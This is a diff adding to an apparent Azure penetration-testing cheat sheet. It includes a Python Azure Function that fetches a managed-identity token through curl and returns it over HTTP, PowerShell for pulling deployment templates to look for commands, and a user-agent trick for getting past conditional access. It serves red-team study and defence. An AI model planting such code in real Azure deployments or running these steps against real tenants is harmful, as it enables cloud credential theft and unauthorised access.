@@ -280,6 +280,42 @@ Get-AzKeyVaultSecret -VaultName {{ VaultName vaultname }} -Name {{ SecretName se
 
 There are some service principals that could be only accessible using determined devices, for example a mobile phone or an IP. In any case, after the token is created it can be used from anywhere.
 
+![You cannot access this right now](imgs/20220427001616.png)  
+
 There are other little tricks that allow to access a service principal protected by a conditional access policy, for example if we have a policy that only allows access from mobile phones, it can be bypassed changing the user agent in Chrome dev tools.
 
 ![User Agent: iPad pro](imgs/20220427001529.png)  
+
+## Abusing GitHub to compromise Azure
+
+If the deployment of GitHub code is automated it could be possible to leverage this to gain remote command execution in the Azure host and extract the token.
+
+```python
+import logging
+import os
+
+import azure.functions as func
+
+def main(req: func.HttpRequest) -> func.HttpResponse:
+    logging.info('Python HTTP trigger function processed a request.') 
+    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] 
+    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+
+    cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+    val = os.popen(cmd).read()
+
+    return func.HttpResponse(val, status_code=200)
+```
+
+Deployment templates can have interesting information
+
+```powershell
+Get-AzResourceGroup
+
+# Check if can read deployment
+Get-AzResourceGroupDeployment -ResourceGroupName {{ ResourceGroupName resourcegroup}}
+
+# Save deployment
+Save-AzResourceGroupDeploymentTemplate -ResourceGroupName {{ ResourceGroupName resourcegroup}}} -DeploymentName {{ DeploymentName deploymentname}}
+# look for commandToExecute
+```
